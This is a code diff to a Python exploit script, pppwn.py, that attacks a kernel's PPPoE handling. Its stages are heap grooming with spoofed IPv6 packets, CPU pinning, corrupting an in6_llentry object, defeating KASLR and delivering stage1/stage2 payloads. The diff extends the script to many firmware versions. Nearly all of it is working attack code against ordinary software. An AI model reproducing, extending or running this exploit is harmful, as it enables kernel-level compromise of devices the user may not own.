@@ -618,7 +618,7 @@ class Exploit():
         print('')
         print('[+] STAGE 0: Initialization')
 
-        self.ppp_negotation(self.build_fake_ifnet)
+        self.ppp_negotation(self.build_fake_ifnet, True)
         self.lcp_negotiation()
         self.ipcp_negotiation()
 
@@ -633,7 +633,10 @@ class Exploit():
 
         for i in range(self.SPRAY_NUM):
             if i % 0x100 == 0:
-                print('[*] Heap grooming...{}%'.format(100 * i //self.SPRAY_NUM),end='\r',flush=True)
+                print('[*] Heap grooming...{}%'.format(100 * i //
+                                                       self.SPRAY_NUM),
+                      end='\r',
+                      flush=True)
 
             source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
 
@@ -661,25 +664,26 @@ class Exploit():
         print('')
         print('[+] STAGE 1: Memory corruption')
 
-        # Use an invalid proto enum to trigger a printf in the kernel. For
-        # some reason, this causes scheduling on CPU 0 at some point, which
-        # makes the next allocation use the same per-CPU cache.
+        # Send invalid packet to trigger a printf in the kernel. For some
+        # reason, this causes scheduling on CPU 0 at some point, which makes
+        # the next allocation use the same per-CPU cache.
         for i in range(self.PIN_NUM):
             if i % 0x100 == 0:
-                print('[*] Pinning to CPU 0...{}%'.format(100 * i //self.PIN_NUM),end='\r',flush=True)
+                print('[*] Pinning to CPU 0...{}%'.format(100 * i //
+                                                          self.PIN_NUM),
+                      end='\r',
+                      flush=True)
 
             self.s.send(
                 Ether(src=self.source_mac,
                       dst=self.target_mac,
-                      type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
-                PPP(proto=0x4141))
-            self.s.recv()
-            sleep(0.0005)
+                      type=ETHERTYPE_PPPOE))
+            sleep(0.001)
 
         print('[+] Pinning to CPU 0...done')
 
         # LCP fails sometimes without the wait
-        sleep(0.5)
+        sleep(1)
 
         # Corrupt in6_llentry object
         overflow_lle = self.build_overflow_lle()
@@ -710,7 +714,9 @@ class Exploit():
         corrupted = False
         for i in reversed(range(self.SPRAY_NUM)):
             if i % 0x100 == 0:
-                print('[*] Scanning for corrupted object...{}'.format(hex(i)),end='\r',flush=True)
+                print('[*] Scanning for corrupted object...{}'.format(hex(i)),
+                      end='\r',
+                      flush=True)
 
             if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
                 continue
@@ -742,10 +748,10 @@ class Exploit():
 
         if not corrupted:
             print('[-] Scanning for corrupted object...failed. Please retry.')
-            print('0')
             exit(1)
 
-        print('[+] Scanning for corrupted object...found {}'.format(source_ipv6))
+        print(
+            '[+] Scanning for corrupted object...found {}'.format(source_ipv6))
 
         print('')
         print('[+] STAGE 2: KASLR defeat')
@@ -766,7 +772,6 @@ class Exploit():
         if (self.pppoe_softc_list & 0xffffffff00000fff
                 != self.offs.PPPOE_SOFTC_LIST & 0xffffffff00000fff):
             print('[-] Error leak is invalid. Wrong firmware?')
-            print('0')
             exit(1)
 
         print('')
@@ -817,13 +822,20 @@ class Exploit():
             self.s.send(Ether(src=self.source_mac, dst=self.target_mac) / frag)
 
         print('[+] Done!')
-        print('1')
 
 
 def main():
     parser = ArgumentParser('pppwn.py')
     parser.add_argument('--interface', required=True)
-    parser.add_argument('--fw', default='1100')
+    parser.add_argument('--fw',
+                        choices=[
+                            '750', '751', '755',
+                            '800', '801', '803', '850', '852',
+                            '900', '903', '904', '950', '951', '960',
+                            '1000', '1001', '1050', '1070', '1071',
+                            '1100'
+                        ],
+                        default='1100')
     parser.add_argument('--stage1', default='/root/PPPwn/stage1/stage1.bin')
     parser.add_argument('--stage2', default='/root/PPPwn/stage2/stage2.bin')
     args = parser.parse_args()
@@ -837,9 +849,24 @@ def main():
     with open(args.stage2, mode='rb') as f:
         stage2 = f.read()
 
-    if args.fw == '11.00':
+    if args.fw in ('750', '751', '755'):
+        offs = OffsetsFirmware_750_755()
+    elif args.fw in ('800', '801', '803'):
+        offs = OffsetsFirmware_800_803()
+    elif args.fw in ('850', '852'):
+        offs = OffsetsFirmware_850_852()
+    elif args.fw == '900':
+        offs = OffsetsFirmware_900()
+    elif args.fw in ('903', '904'):
+        offs = OffsetsFirmware_903_904()
+    elif args.fw in ('950', '951', '960'):
+        offs = OffsetsFirmware_950_960()
+    elif args.fw in ('1000', '1001'):
+        offs = OffsetsFirmware_1000_1001()
+    elif args.fw in ('1050', '1070', '1071'):
+        offs = OffsetsFirmware_1050_1071()
+    elif args.fw == '1100':
         offs = OffsetsFirmware_1100()
-        
 
     exploit = Exploit(offs, args.interface, stage1, stage2)
     exploit.run()
